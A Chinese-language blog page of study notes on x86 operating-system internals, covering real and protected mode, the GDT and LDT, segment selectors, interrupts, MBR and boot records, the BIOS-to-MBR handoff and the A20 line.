<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/27/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/27/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/" class="post-title-link" itemprop="url">操作系统真象还原（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 17:23:24" itemprop="dateCreated datePublished" datetime="2022-04-09T17:23:24+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-17 15:06:56" itemprop="dateModified" datetime="2022-04-17T15:06:56+08:00">2022-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="陷入内核"><a href="#陷入内核" class="headerlink" title="陷入内核"></a>陷入内核</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649158216559-1650179214572.png" class width="1649158216559"> 
<p>如果把软件分层的话， 最外圈是应用程序，里面是操作系统，应用程序处于特权级 3（ring 3），操作系统内核处于特权级 0（ring 0），当用户程序欲访问系统资源时（无论是硬件，还是内核数据结构），它需要进行系统调用，这样 CPU 便进入了内核态，也称看图中凹下去的部分，是不是有陆进去的感觉，这就是“陷入内核” </p>
<h2 id="实模式（20位）"><a href="#实模式（20位）" class="headerlink" title="实模式（20位）"></a>实模式（20位）</h2><p>实模式出现于早期8088CPU时期，当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器，所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式，当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(段基址：段偏移量)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个字段是段基址：它的值是由 <strong>段寄存器</strong> 提供的(一般来说，段寄存器有6种，分别为cs，ds，ss，es，fs，gs，这几种段寄存器都有自己的特殊意义)</li>
<li>第二字段是段内偏移量：代表你要访问的这个内存地址距离这个段基址的偏移它的值就是由通用寄存器来提供的，所以也是16位</li>
<li>那么两个16位的值如何组合成一个20位的地址呢？CPU采用的方式是把段寄存器所提供的段基址先向左移4位，这样就变成了一个20位的值，然后再与段偏移量相加</li>
</ul>
<h2 id="保护模式-（32位）"><a href="#保护模式-（32位）" class="headerlink" title="保护模式 （32位）"></a>保护模式 （32位）</h2><p>随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位，所以实模式下的内存地址计算方式就已经不再适合了，所以就引入了现在的保护模式，实现更大空间的，更灵活也更安全的内存访问</p>
<p>我们的偏移值和实模式下是一样的，就是变成了32位而已，而段值仍旧是存放在原来16位的段寄存器中， <strong>但是这些段寄存器存放的却不再是段基址了</strong> ，毕竟之前说过实模式下寻址方式不安全，我们在保护模式下需要加一些限制，而这些限制可不是一个寄存器能够容纳的，于是我们把这些关于内存段的限制信息放在一个叫做 <strong>全局描述符表(GDT)</strong> 的结构里</p>
<p><strong>保护模式 VS 实模式</strong></p>
<ul>
<li>实模式的不足<ul>
<li>实模式下操作系统和用户程序属于同一特权级，没有区别对待</li>
<li>用户程序所引用的地址都是指向真实的物理地址，也就是说逻辑地址等于物理地址，实实在在地 指哪打哪</li>
<li>用户程序可以自由修改段基址，可以不亦乐乎地访问所有内存，没人拦得住 </li>
<li>访问超过 64KB 的内存区域时要切换段基址，转来转去容易晕乎</li>
<li>一次只能运行一个程序，无法充分利用计算机资源</li>
<li>共 20 条地址线，最大可用内存为1MB ，这即使在 20 年前也不够用</li>
</ul>
</li>
<li>保护模式的优越<ul>
<li>建立了全局描述符表（GDT），用于存储寄存器存不下的信息<ul>
<li>实模式中直接把偏移地址写在段寄存器上</li>
<li>保护模式则存储在GDT中并添加了许多“约束条件”，而寄存器中则写入段选择子用于索引对应的段信息</li>
</ul>
</li>
<li>寻址方式扩展<ul>
<li>实模式下对于内存寻址来说：“基址寻址、变址寻址、基址变址寻址”这三种形式中的基址寄存器只能是 “bx，bp”，变址寄存器只能是 “si，di”，也就是说，只能用这4个寄存器</li>
<li>总之实模式下的寄存器有固定的使命，对于寻址来说，若想用其他的寄存器，甭说 CPU 报不报错，就连编译这关都过不了</li>
<li>在保护模式下，这一切都不同了，同样是在内存寻址中，基址寄存器不再只是 “bx，bp”，而是所有 32 位的通用寄存器，变址寄存器也是一样，不再只是 “si，di”，而是除 esp 之外的所有 32 通用寄存器</li>
</ul>
</li>
<li>指令扩展 <ul>
<li>在16位的实模式下， CPU 的操作数是16位，在32位的保护模式下，操作数扩展到了32位，于是涉及到操作数变化的指令也要跟着扩展，既要兼容16位的操作数，也要支持32位的操作数 </li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>保护模式的开关</strong></p>
<p>控制寄存器 CRx 系列是 CPU 的窗口，既可以用来展示 CPU 的内部状态，也可用于控制 CPU 的运行机制，进入保护模式，关键就是 CR0 的PE字段</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649696453838.png" class width="1649696453838"> 
<ul>
<li>PE=0 表示在实模式下运行</li>
<li>PE=1 表示在保护模式下运行</li>
</ul>
<p><strong>保护模式的保护机制</strong></p>
<ul>
<li>向段寄存器加载选择子时的保护：<ul>
<li>当引用一个内存段时，实际上就是往段寄存器中加载个选择子，为了避免出现非法引用内存段的情况， 在这时候，处理器会在以下几方面做出检查：</li>
<li>验证段描述符是否超越界限<ul>
<li>保护内容：<ul>
<li>选择子的索引值一定要小于等于描述符表（GOT LDT）中描述符的个数</li>
</ul>
</li>
<li>保护实现：<ul>
<li>处理器先检查 TI 的值<ul>
<li>如果 TI=0，则从全局描述符表寄存器 gdtr 中拿到 GOT 基地址和 GOT 界限值</li>
<li>如果 TI=1，则从局部描述符表寄存器 ldtr 中拿到 LDT 基地址和 LDT 界限值</li>
</ul>
</li>
<li>然后把“选择子的高13位”代入以下的表达式<ul>
<li>描述符表基地址+选择子中的索引值*8+7 &lt;= 描述符表基址+标识符表界限值</li>
<li>若不成立，处理器则抛出异常 </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>代码段和数据段的保护<ul>
<li>保护内容：<ul>
<li>对于代码段和数据段来说，CPU 每访问一个地址，都要确认该地址不能超过其所在内存段的范围</li>
</ul>
</li>
</ul>
</li>
<li>栈段的保护</li>
</ul>
</li>
</ul>
<h2 id="全局描述符表"><a href="#全局描述符表" class="headerlink" title="全局描述符表"></a>全局描述符表</h2><p>全局描述符表中含有一个个表项，每一个表项称为 <strong>段描述符</strong> ，而段寄存器在保护模式下存放的便是相当于一个数组索引的东西，通过这个索引，可以找到对应的表项，段描述符存放了段基址、段界限、内存段类型属性(比如是数据段还是代码段，注意 <strong>一个段描述符只能用来定义一个内存段</strong>)等许多属性,具体信息见下图： </p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649674596041.png" class width="1649674596041">   
<p>全局描述符表位于内存中，需要用专门的寄存器指向它后，CPU 才知道它在哪里，这个专门的寄存器便是 <strong>GDTR</strong> (一个48位的寄存器)，专门用来存储 GDT 的内存地址及大小</p>
<ul>
<li><strong>段界限</strong>：表示段边界的扩张最值，即最大扩展多少或最小扩展多少，用20位来表示，它的单位可以是字节，也可以是4KB，这是由G位决定的</li>
<li><strong>G位</strong>：G为0时表示单位为字节，G为1时表示单位为4KB</li>
<li><strong>段基址</strong>：真正的段基址（共分为3部分来存储）</li>
<li><strong>TYPE字段</strong>：用来指定本描述符的类型<ul>
<li>什么是系统段？各种称为“门”的结构便是系统段，也就是硬件系统需要的结构，非软件使用的调用门、任务门</li>
<li>简而言之，门的意思就是入口，它通往一段程序</li>
<li>TYPE字段共4位，用于表示内存段或门的子类型</li>
</ul>
</li>
<li><strong>S位</strong>：S为0时表示系统段，S为1时表示数据段）<ul>
<li>一个段描述符，在 CPU 眼里分为两大类，要么描述的是系统段，要么描述的是数据段 </li>
<li>凡是硬件运行需要用到的东西都可称之为系统</li>
<li>凡是软件需要的东西都称为数据，无论是代码，还是数据，甚至包括栈，它们都作为硬件的输入，都是给硬件的数据而己，所以代码段在段描述符中也属于数据段</li>
</ul>
</li>
<li><strong>DPL字段</strong>：Descriptor Privilege Level ，即描述符特权级<ul>
<li>这是保护模式提供的安全解决方案，将计算机世界按权力划分成不同等级，每一种等级称为一种特权级（分为 ring0 ~ ring3）</li>
<li>特权级是保护模式下才有的东西，CPU 由实模式进入保护模式后，特权级自动为0<ul>
<li>因为保护模式的代码已经是操作系统的一部分了，所以操作系统应该处于最高的0特权级</li>
<li>用户程序通常处于3特权级，权限最小</li>
<li>某些指令只能在0特权级下执行，从而保证了安全</li>
</ul>
</li>
</ul>
</li>
<li><strong>P位</strong>：Present，即段是否存在<ul>
<li>如果该段存在于内存中，则P为1，反之P为0</li>
<li>P位是由CPU来检查的，如果P为0，则CPU将会抛出异常然后跳转到对应的异常处理程序，然后把P改为1（这个异常处理程序是由开发人员来写的）</li>
</ul>
</li>
<li><strong>AVL位</strong>：从名字上看它是 AVaiLable，可用的<ul>
<li>不过这“可用的”是对用户来说的，也就是操作系统可以随意用此位，对硬件来说，它没有专门的用途</li>
</ul>
</li>
<li><strong>L位</strong>：用来设置是否是 64 位代码段<ul>
<li>L为1表示64位代码段，否则表示32位代码段</li>
</ul>
</li>
<li><strong>D/B位</strong>：用来指示有效地址（段内偏移地址）及操作数的大小<ul>
<li>对于代码段来说，此位是D位<ul>
<li>若D为0，表示指令中的有效地址和操作数是16位，指令有效地址用IP寄存器</li>
<li>若D为1，表示指令中的有效地址及操作数是32位，指令有效地址用EIP寄存器</li>
</ul>
</li>
<li>对于栈段来说，此位是B位，用来指定操作数大小（此操作数涉及到“对栈指针寄存器的选择”以及“栈的地址上限”）<ul>
<li>若B为0，使用的是sp寄存器，使用16位寄存器（最大寻址范围：0~0xFFFF）</li>
<li>若B为1，使用的是esp寄存器，使用32位寄存器（最大寻址范围：0~0xFFFFFFFF）</li>
</ul>
</li>
</ul>
</li>
<li><strong>段的选择子</strong>：（在段寄存器 CS、 DS、 ES、 FS、 GS、 SS 中）<ul>
<li>在实模式下时，段中存储的是段基地址，即内存段的起始地址</li>
<li>而在保护模式下时，由于段基址已经存入了段描述符中（各个段描述符组织为GDT表），所以段寄存器中再存放段基址是没有意义的，在段寄存器中存入的是一个叫作选择子的东西</li>
<li>选择子“基本上”是个索引值（虽然它还有其他内容，暂时忽略）， 就是 GDT 中的下标，段选择子的结构如下：</li>
</ul>
</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649160006227-1650179214572.png" class width="1649160006227"> 
<ul>
<li>RPL：请求特权级别，通俗的讲我用什么权限来请求</li>
<li>TI：TI=0时，查GDT表，TI=1时，查LDT表</li>
<li>Index：处理器将索引值乘以8在加上GDT或者LDT的基地址，就是要加载的段描述符</li>
</ul>
<h2 id="局部描述符表"><a href="#局部描述符表" class="headerlink" title="局部描述符表"></a>局部描述符表</h2><p>CPU 厂商建议每个任务的私有内存段都应该放到自己的段描述符表中，该表就是局部描述符表（LDT），即每个任务都有自己的 LDT ，随着任务切换，也要切换相应任务的 LDT</p>
<ul>
<li>LDT 局部描述符表可以有若干张，每个任务可以有一张 </li>
<li>LDT 也位于内存中，其地址需要先被加载到某个寄存器后，CPU 才能使用 LDT，该寄存器是 LDTR（即 LDT Register）</li>
<li>LDT 跟 GDT 差不多，跳转的时候选择子的TI=0我们就用 GDT，如果TI=1我们就用 LDT<ul>
<li>TI=0时：CS:IP=全局描述符表中第 1(0x8&gt;&gt;3) 项描述符给出的段基址 +0 的偏移地址</li>
<li>TI=1时：CS:IP=局部描述符表中第 1(0x8&gt;&gt;3) 项描述符给出的段基址 +0 的偏移地址 </li>
</ul>
</li>
</ul>
<p>LDT 的使用步骤如下：</p>
<ul>
<li>定义一个局部描述符表 LDT</li>
<li>在 GDT 中定义一个描述符 Descriptor_LDT：<ul>
<li>其基地址用 LDT 的起始地址填充</li>
<li>描述符 Descriptor_LDT 的选择子为 SelectorLDT</li>
</ul>
</li>
<li>用 lldt 命令加载 lgtr</li>
<li>jmp时的选择子 TI=1 就可以了</li>
</ul>
<h2 id="物理地址，有效地址，虚拟地址"><a href="#物理地址，有效地址，虚拟地址" class="headerlink" title="物理地址，有效地址，虚拟地址"></a>物理地址，有效地址，虚拟地址</h2><ul>
<li>物理地址：<ul>
<li>就是物理内存真正的地址，相当于内存中每个存储单元的门牌号，具有唯一性</li>
<li>在实模式下，“段基址＋段内偏移地址”经过段部件的处理，直接输出的就是物理地址</li>
<li>物理地址＝块号＋页内地址</li>
</ul>
</li>
<li>有效地址（逻辑地址）：<ul>
<li>无论在实模式或是保护模式下，段内偏移地址又称为有效地址，也称为逻辑地址（这是程序员可见的地址）</li>
<li>逻辑地址＝页号＋页内地址</li>
</ul>
</li>
<li>虚拟地址（线性地址）：<ul>
<li>在保护模式下，“段基址＋段内偏移地址”称为线性地址，不过，此时的段基址已经不再是真正的地址，而是个被称为选择子的东西（它本质是个索引，类似于数组下标，通过这个索引便能在 GDT 中找到相应的段描述符）</li>
<li>若开启了分页功能，那么线性地址又多了个名字，就就是虚拟地址，虚拟地址要经过页部件转换成具体的物理地址，这样 CPU 才能将其送上地址总线去访问内存</li>
</ul>
</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649160944655-1650179214572.png" class width="1649160944655"> 
<h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649161146525-1650179214572.png" class width="1649161146525"> 
<h2 id="编译型语言-amp-解释型语言"><a href="#编译型语言-amp-解释型语言" class="headerlink" title="编译型语言&amp;解释型语言"></a>编译型语言&amp;解释型语言</h2><ul>
<li>解释型语言<ul>
<li>也称为脚本语言，如 JavaScript Python Perl PHP Shell 脚本等，它们本身是文本文件，是某个应用程序的输入，这个应用程序是脚本解释器</li>
<li>脚本中的代码从来没真正上过 CPU 去执行， CPU CS: ip 寄存器从来没指向过它们，在 CPU 眼里只看得到脚本解释器，而这些脚本中的代码， CPU 从来就不知道有它们的存在</li>
<li>这些脚本代码看似在按照开发人员的逻辑执行，本质上是脚本解释器在时时分析这个脚本，动态根据关键字和语法来做出相应的行为</li>
</ul>
</li>
<li>编译型语言<ul>
<li>编译型语言编译出来的程序运行时本身就是一个进程它是由操作系统直接调用的，也就是由操作系统加载到内存后，操作系统将 CS: IP 寄存器指向这个程序的入口，使它直接上 CPU 运行</li>
<li>总之调度器在就绪队列中能看到此进程，而解释型程序是无法让调度器“入眼”的，调度器只会看到该脚本语言的解释器</li>
</ul>
</li>
</ul>
<h2 id="BIOS中断，DOS中断，Linux中断"><a href="#BIOS中断，DOS中断，Linux中断" class="headerlink" title="BIOS中断，DOS中断，Linux中断"></a>BIOS中断，DOS中断，Linux中断</h2><p>BIOS DOS 都是存在于实模式下的程序，由它们建立的中断调用都是建立在中断向量表（Interrupt Vector Table，IVT）中的，它们都是通过软中断指令 int 中断号来调用的</p>
<p>中断向量表中的每个中断向量大小是4字节，这4字节描述了一个中断处理例程（程序）的段基址和 段内偏移地址，因为中断向量表的长度为 1024 字节，故该表最多容纳 256 个中断向量处理程序，计算机启动之初，中断向量表中的中断例程是由 BIOS 立的，它从物理内存地址 0x0000 处初始化并在中断向量表中添加各种处理例程</p>
<ul>
<li>BIOS中断<ul>
<li>BIOS中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行</li>
<li>BIOS也是一段程序，是程序就很可能要重复性地执行某段代码，它直接将其写成中断函数，直接调用多省心</li>
<li>BIOS中断还可以给后来的程序用，如加载器或 boot loader，它们在调用硬件资源时就不需要自己重写代码了</li>
</ul>
</li>
<li>DOS中断<ul>
<li>DOS是运行在实模式下的，故其建立的中断调用也建立在中断向量表中，只不过其中断向量号和 BIOS 的不能冲突</li>
<li>DOS中断只占用 0x21 这个中断号，也就是 DOS 只有这一个中断例程</li>
<li>DOS中断调用中那么多功能是如何实现的：通过先往 ah 寄存器中写好子功能号，再执行 int 0x21 这时在中断向量表中第 0x21 个表项（即物理地址 0x21*4 处中的中断处理程序），开始根据寄存器 ah 中的值来调用相应的子功能</li>
</ul>
</li>
<li>Linux中断<ul>
<li>Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表己经不存在了，取而代之的是中断描述符表（Interrupt Descriptor Table，IDT）</li>
<li>Linux 的系统调用和 DOS 中断调用类似，不过 Linux 是通过 int 0x80 指令进入一个中断程序后再根据 eax 寄存器的值来调用不同的子功能函数的（ebx，ecx，edx作为参数）</li>
</ul>
</li>
</ul>
<h2 id="魔数"><a href="#魔数" class="headerlink" title="魔数"></a>魔数</h2><p>魔数，其实也称为神奇数字，它被用来为重要的数据定义标签，用独特的数字唯一地标识该数据</p>
<p>案例：</p>
<ul>
<li>主引导记录最后的两个字节的内容是 0x55, 0xaa，这表明这个扇区里面有可加载的程序， BIOS 就用它来校验该扇区是否可引导</li>
<li>各分区都有超级块，一般位于本分区的第2个扇区，超级块里面记录了此分区的信息，其中就有文件系统的魔数，一种文件系统对应一个魔数，比对此值便知道文件系统类型</li>
</ul>
<h2 id="MBR，EBR，DBR，OBR"><a href="#MBR，EBR，DBR，OBR" class="headerlink" title="MBR，EBR，DBR，OBR"></a>MBR，EBR，DBR，OBR</h2><p>计算机在接电之后运行的是基本输入输出系统 BIOS，而 BIOS 是位于主板上的一个小程序，其所在的空间有限，代码量较少，功能受限，因此它不可能一人扛下所有的任务需求，也就是肯定不能充 当操作系统的角色，必须采取控制权接力的方式，一步步地让处理器执行更为复杂强大的指令，最终把处理器的使用权交给操作系统，这才让计算机走上了正轨，从而可以完成各种复杂的功能</p>
<p>采用接力式控制权交接，BIOS 只完成一些简单的检测或初始化工作，然后找机会把处理器使用权交出去：下一个接力棒的选手是 MBR（为了方便 BIOS 找到 MBR，MBR 必须在固定的位置等待，因此位于整个硬盘最开始的扇区）</p>
<ul>
<li><p>MBR（Main Boot Record）</p>
<ul>
<li>MBR 是主引导记录，它存在于整个硬盘最开始的那个扇区，即 0盘 0道 1扇区，这个扇区便称为 MBR 引导扇区</li>
<li>MBR 引导扇区中的内容是：446字节的引导程序及参数（bootloader），64字节的分区表，2字节结束标记 0x55 0xaa</li>
</ul>
</li>
<li><p>OBR（OS Boot Record）</p>
<ul>
<li>为了 MBR 方便找到活动分区上的内核加载器，内核加载器的入口地址也必须在固定的位置，这个位置就是各分区最开始的扇区，这个“各分区起始的扇区”中存放的是操作系统引导程序 一一 内核加载器</li>
<li>因此该扇区称为操作系统引导扇区，其中的引导程序（内核加载器）称为操作系统引导记录 OBR（即 OS Boot Recod），此扇区也被称为 OBR 引导扇区</li>
</ul>
</li>
<li><p>DBR（DOS Boot Record）</p>
<ul>
<li>OBR 是从 DBR 遗留下来的， 要想了解 OBR，还是先从了解 DBR 开始，DBR（DOS Boot Record），也就是 DOS 操作系统的引导记录</li>
<li>DBR 中的内容大概是：<ul>
<li>跳转指令，使 MBR 跳转到引导代码</li>
<li>厂商信息、 DOS 版本信息</li>
<li>BIOS 参数块 BPB（即 BIOS Parameter Block）</li>
<li>操作系统引导程序</li>
<li>结束标记 0x55 和 0xaa</li>
</ul>
</li>
<li>在 DOS 时代只有4个分区，不存在扩展分区，这4个分区都相当于主分区，所以各主分区最开始的扇区称为 DBR 引导扇区，后来有了扩展分区之后，无论分区是主分区，还是逻辑分区，为了兼容，分区最开始的扇区都作为 DOS 引导扇区</li>
<li>后来 DOS 也退出历史舞台了，所以 DBR 也称为 OBR</li>
</ul>
</li>
<li><p>EBR（Expand Boot Record）</p>
<ul>
<li>当初为了解决分区数量限制的问题才有了扩展分区， EBR 是扩展分区中为了兼容 MBR 才提出的概念，主要是兼容 MBR 中的分区表</li>
<li>EBR 位于各子扩展分区中最开始的扇区（注意：各主分区和各逻辑分区中最开始的扇区是操作系统引导扇区），理论上 MBR 只有1个，但 EBR 有无数个</li>
</ul>
</li>
</ul>
<h2 id="接力式控制权交接"><a href="#接力式控制权交接" class="headerlink" title="接力式控制权交接"></a>接力式控制权交接</h2><p><strong>BIOS主导</strong></p>
<p>BIOS 是计算机上第一个运行的软件，但它不可能自己加载自己，由此可以知道，它是由硬件加载的 —— 只读存储器 ROM（只读存储器中的内容是不可擦除的）</p>
<p>BIOS 代码所做的工作也是一成不变的，而且在正常情况下，其本身是不需要修改的（平时听说的那些主板坏了要刷 BIOS 的情况属于例外），于是 BIOS 顺理成章地便被写进此 ROM</p>
<p>此 ROM 被映射在低端 lMB 内存的顶部，即地址 0xF0000 ~ 0xFFFFF 处，只要访问此处的地址便是访问了 BIOS（这个映射是由硬件完成的），在开机的瞬间，也就是接电的一瞬间，CPU CS: IP 寄存器被强制初始化为 0xF000: 0xFFF0 （指向有效地址 0xFFFF0），此地址便是 BIOS 的入口地址</p>
<p>因为 BIOS 是在实模式下运行的，而实模式只能访问 1MB 空间（20位地址线，2的20次方是1MB）而地址 0xFFF0 距离 1MB 只有16个字节了，肯定不能完成全部的工作，所以此处的代码只能是个跳转指令 <code>jmp far f000:e05b</code>（即跳向了 0xfe05b 处，这是 BIOS 代码真正开始的地方）</p>
<p>接下来 BIOS 便马不停蹄地检测内存、显卡等外设信息，当检测通过，并初始化好硬件后，开始在内存中 0x000 ~ 0x3FF 处建数据结构，中断向量表 IVT 并填写中断例程，BIOS 最后一项工作就是校验启动盘中位于“0盘0道1扇区”的内容</p>
<p><strong>MBR主导</strong></p>
<p>BIOS 将会加载存储设备上，第一个扇区（通常512字节）到内存（0x7c00），然后跳转到 0x7c00 的第一条地址开始执行，这512字节就是 MBR，其中包含了BootLoader（最后两字节固定）</p>
<p>通常，MBR 的任务是加载某个程序（这个程序一般是内核加载器，很少有直接加载内核的）到指定位置，并将控制权交给它（所谓的交控制权就是 jmp 去而己），之后 MBR 就没用了，被覆盖也没关系</p>
<p>MBR 的大小必须是 512 字节，这是为了保证 0x55 0xaa 这两个魔数恰好出现在该扇区的最后两个字节处（即第 510 字节处和第 511 字节处），由于我们的 bochs 模拟的是 x86 平台，所以是小端字节序，故其最后两个字节内容是 0xaa55 </p>
<h2 id="A20地址线"><a href="#A20地址线" class="headerlink" title="A20地址线"></a>A20地址线</h2><p>地址（Address ）线从0开始编号，在 8086/8088 中，只有20位地址线，即 A0 ~ A19</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649695447640.png" class width="1649695447640"> 
<p>对于 80286 后续的 CPU，虽然地址总线从原来的20位发展到了24位，但它们为了兼容20位的地址线，采用了 A20GATE 来控制 A20 地址线</p>
<ul>
<li>如果 A20Gate 被打开，当访问到 0x100000 ~ 0x10FFEF 之间的地址时， CPU 将真正访问这块物理内存（正常使用24位的地址线）</li>
<li>如果 A20Gate 被禁止，当访问 0x100000 ~ 0x10FFEF 之间的地址时， CPU 将采用 8086/8088 的地址回绕（为了兼容 8086/8088 的实模式）</li>
</ul>
